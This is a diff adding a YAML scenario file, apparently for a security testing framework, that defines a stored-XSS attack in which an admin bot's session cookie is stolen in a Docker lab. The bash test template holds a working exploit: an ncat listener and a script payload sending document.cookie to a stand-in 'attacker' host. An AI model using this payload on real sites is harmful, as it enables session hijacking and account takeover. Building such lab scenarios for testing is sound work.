@@ -1,0 +1,45 @@
+id: session_theft_via_xss
+description: >
+  Steal an admin user's session cookie by injecting a stored XSS payload that
+  executes in the context of an admin bot's authenticated headless browser
+  session. The payload exfiltrates document.cookie to an attacker-controlled
+  HTTP listener via an image tag or fetch request. The stolen cookie can then
+  be used to access admin-only functionality.
+compatible_vuln_patterns:
+  - xss_admin_bot
+success_criteria:
+  description: >
+    The attacker starts an HTTP listener on port 9999, injects a stored XSS
+    payload containing a document.cookie exfiltration script, triggers the
+    admin bot to visit the page, and receives the admin's session cookie on
+    the listener. The captured data contains an identifiable session token.
+  output_pattern: 'admin_token=|session_id=|session=|connect\.sid='
+test_template: |
+  # Step 1: start listener to catch exfiltrated cookies
+  rm -f /tmp/exfil.txt
+  timeout 30 bash -c 'ncat -lnvp 9999 > /tmp/exfil.txt' &
+  LISTENER_PID=$!
+  sleep 2
+
+  # Step 2: inject XSS payload that exfiltrates cookies to our listener
+  curl -s -X POST "http://target:{{port}}/{{submit_endpoint}}" \
+    --data-urlencode "{{input_parameter}}=<script>new Image().src='http://attacker:9999/?c='+document.cookie</script>"
+
+  # Step 3: trigger the admin bot to visit the page
+  curl -s "http://target:{{port}}/{{trigger_endpoint}}"
+
+  # Step 4: wait for bot to execute JS and exfiltration to arrive
+  sleep 15
+
+  # Step 5: check captured data for admin session cookie
+  kill $LISTENER_PID 2>/dev/null
+  wait $LISTENER_PID 2>/dev/null
+  cat /tmp/exfil.txt | grep -iE 'admin_token|session_id|session|connect\.sid'
+notes: >
+  Requires Node.js and Puppeteer (with system Chromium) installed on the
+  target container — the admin bot runs there as a service component. The
+  deploy_snippet must install chromium-browser, nodejs, npm, and puppeteer.
+  The admin bot script must use --no-sandbox and
+  executablePath: /usr/bin/chromium-browser. The session cookie MUST NOT be
+  HttpOnly. Both containers share a Docker bridge network so the browser on
+  target resolves 'attacker' via Docker DNS.
